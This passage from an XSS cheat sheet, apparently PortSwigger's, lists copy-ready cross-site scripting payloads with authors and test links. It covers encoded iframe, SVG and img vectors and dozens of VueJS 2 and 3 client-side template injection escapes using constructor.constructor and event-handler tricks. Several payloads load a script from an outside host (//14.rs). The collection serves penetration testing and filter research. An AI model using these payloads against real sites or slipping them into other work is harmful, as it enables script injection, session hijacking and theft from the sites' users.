Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nIframe JavaScript URL with HTML and URL encoding\n\n[`<iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20src%3D%22javascript%3A%27%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x25%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x46%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x25%3B%26%23x33%3B%26%23x45%3B%27%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#iframe-javascript-url-with-html-and-url-encoding)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSVG script with unicode escapes and HTML encoding\n\n[`<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cscript%3E%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%281%29%3C%2Fscript%3E%3C%2Fsvg%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-script-with-unicode-escapes-and-html-encoding)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nImg tag with base64 encoding\n\n[``<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>``](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20src%3Dx%20onerror%3Dlocation%3Datob%60amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p%60%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#img-tag-with-base64-encoding)\n\nClient-side template injection\n------------------------------\n\n### VueJS reflected\n\nVersion:\n\nAuthor:\n\nLength:\n\nVector:\n\nCopy:\n\nVersion 2\n\n[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)\n\n41\n\n[`{{constructor.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected1)\n\nVersion 2\n\n[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53) & [Sebastian Lekies](https://twitter.com/slekies) (Google) & [Eduardo Vela Nava](https://twitter.com/sirdarckcat) (Google) & [Krzysztof Kotowicz](https://twitter.com/kkotowicz) (Google)\n\n62\n\n[`<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cdiv%20v-html%3D%22%27%27.constructor.constructor%28%27alert%281%29%27%29%28%29%22%3Ea%3C%2Fdiv%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected2)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)\n\n39\n\n[`<x v-html=_c.constructor('alert(1)')()>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20v-html%3D_c.constructor%28%27alert%281%29%27%29%28%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected3)\n\nVersion 2\n\n[Peter af Geijerstam](https://twitter.com/p4fg) (Swedish Shellcode Factory)\n\n37\n\n[`<x v-if=_c.constructor('alert(1)')()>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20v-if%3D_c.constructor%28%27alert%281%29%27%29%28%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected4)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n32\n\n[`{{_c.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B_c.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected5)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n32\n\n[`{{_v.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B_v.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected6)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n32\n\n[`{{_s.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B_s.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected7)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n39\n\n[``<p v-show=\"_c.constructor`alert(1)`()\">``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cp%20v-show%3D%22_c.constructor%60alert%281%29%60%28%29%22%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected8)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n52\n\n[``<x v-on:click='_b.constructor`alert(1)`()'>click</x>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20v-on%3Aclick%3D%27_b.constructor%60alert%281%29%60%28%29%27%3Eclick%3C%2Fx%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected9)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n41\n\n[``<x v-bind:a='_b.constructor`alert(1)`()'>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20v-bind%3Aa%3D%27_b.constructor%60alert%281%29%60%28%29%27%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected10)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<x @[_b.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%40%5B_b.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected11)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<x :[_b.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%3A%5B_b.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected12)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<p v-=_c.constructor`alert(1)`()>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cp%20v-%3D_c.constructor%60alert%281%29%60%28%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected13)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<x #[_c.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%23%5B_c.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected14)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n32\n\n[``<p :=_c.constructor`alert(1)`()>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cp%20%3A%3D_c.constructor%60alert%281%29%60%28%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected15)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n32\n\n[`{{_c.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B_c.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected16)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n30\n\n[``{{_b.constructor`alert(1)`()}}``](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B_b.constructor%60alert%281%29%60%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected17)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n40\n\n[`<x v-bind:is=\"'script'\" src=\"//14.rs\" />`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20v-bind%3Ais%3D%22%27script%27%22%20src%3D%22%2F%2F14.rs%22%20%2F%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected18)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n27\n\n[`<x is=script src=//\u246d.\u20a8>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20is%3Dscript%20src%3D%2F%2F%E2%91%AD.%E2%82%A8%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected19)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n48\n\n[``<x @click='_b.constructor`alert(1)`()'>click</x>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%40click%3D%27_b.constructor%60alert%281%29%60%28%29%27%3Eclick%3C%2Fx%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected20)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<x @[_b.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%40%5B_b.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected21)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<x :[_b.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%3A%5B_b.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected22)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n33\n\n[``<x #[_c.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20%23%5B_c.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected23)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n52\n\n[`<x title\"=\"&lt;iframe&Tab;onload&Tab;=alert(1)&gt;\">`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22%3D%22%26lt%3Biframe%26Tab%3Bonload%26Tab%3B%3Dalert%281%29%26gt%3B%22%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected24)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n73\n\n[`<x title\"=\"&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;\">`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22%3D%22%26lt%3Biframe%26Tab%3Bonload%26Tab%3B%3DsetTimeout%28%2Falert%281%29%2F.source%29%26gt%3B%22%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected25)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n31\n\n[`<xyz<img/src onerror=alert(1)>>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cxyz%3Cimg%2Fsrc%20onerror%3Dalert%281%29%3E%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected26)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n116\n\n[`<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Csvg%3E%3Csvg%3E%3Cb%3E%3Cnoscript%3E%26lt%3B%2Fnoscript%26gt%3B%26lt%3Biframe%26Tab%3Bonload%3DsetTimeout%28%2Falert%281%29%2F.source%29%26gt%3B%3C%2Fnoscript%3E%3C%2Fb%3E%3C%2Fsvg%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected27)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n59\n\n[`<a @['c\\lic\\u{6b}']=\"_c.constructor('alert(1)')()\">test</a>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Ca%20%40%5B%27c%5Clic%5Cu%7B6b%7D%27%5D%3D%22_c.constructor%28%27alert%281%29%27%29%28%29%22%3Etest%3C%2Fa%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected28)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n42\n\n[`{{$el.ownerDocument.defaultView.alert(1)}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B%24el.ownerDocument.defaultView.alert%281%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected29)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n56\n\n[`{{$el.innerHTML='\\u003cimg src onerror=alert(1)\\u003e'}}`](https://portswigger-labs.net/xss/vuejs.php?x=%7B%7B%24el.innerHTML%3D%27%5Cu003cimg%20src%20onerror%3Dalert%281%29%5Cu003e%27%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected30)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n45\n\n[`<img src @error=e=$event.path.pop().alert(1)>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cimg%20src%20%40error%3De%3D%24event.path.pop%28%29.alert%281%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected31)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n55\n\n[`<img src @error=e=$event.composedPath().pop().alert(1)>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cimg%20src%20%40error%3De%3D%24event.composedPath%28%29.pop%28%29.alert%281%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected32)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n30\n\n[`<img src @error=this.alert(1)>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cimg%20src%20%40error%3Dthis.alert%281%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected33)\n\nVersion 2\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n24\n\n[`<svg@load=this.alert(1)>`](https://portswigger-labs.net/xss/vuejs.php?x=%3Csvg%40load%3Dthis.alert%281%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected34)\n\nVersion 2\n\n[Davit Karapetyan](https://twitter.com/davwwwx) (Independent consultant)\n\n72\n\n[`<p slot-scope=\"){}}])+this.constructor.constructor('alert(1)')()})};//\">`](https://portswigger-labs.net/xss/vuejs.php?x=%3Cp%20slot-scope%3D%22%29%7B%7D%7D%5D%29%2Bthis.constructor.constructor%28%27alert%281%29%27%29%28%29%7D%29%7D%3B%2F%2F%22%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected35)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n40\n\n[`{{_openBlock.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vue3.php?x=%7B%7B_openBlock.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected36)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n42\n\n[`{{_createBlock.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vue3.php?x=%7B%7B_createBlock.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected37)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n46\n\n[`{{_toDisplayString.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vue3.php?x=%7B%7B_toDisplayString.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected38)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n42\n\n[`{{_createVNode.constructor('alert(1)')()}}`](https://portswigger-labs.net/xss/vue3.php?x=%7B%7B_createVNode.constructor%28%27alert%281%29%27%29%28%29%7D%7D)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected39)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n47\n\n[``<p v-show=_createBlock.constructor`alert(1)`()>``](https://portswigger-labs.net/xss/vue3.php?x=%3Cp%20v-show%3D_createBlock.constructor%60alert%281%29%60%28%29%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected40)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n41\n\n[``<x @[_openBlock.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vue3.php?x=%3Cx%20%40%5B_openBlock.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected41)\n\nVersion 3\n\n[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)\n\n42\n\n[``<x @[_capitalize.constructor`alert(1)`()]>``](https://portswigger-labs.net/xss/vue3.php?x=%3Cx%20%40%5B_capitalize.constructor%60alert%281%29%60%28%29%5D%3E)\n\n ![Copy vector to 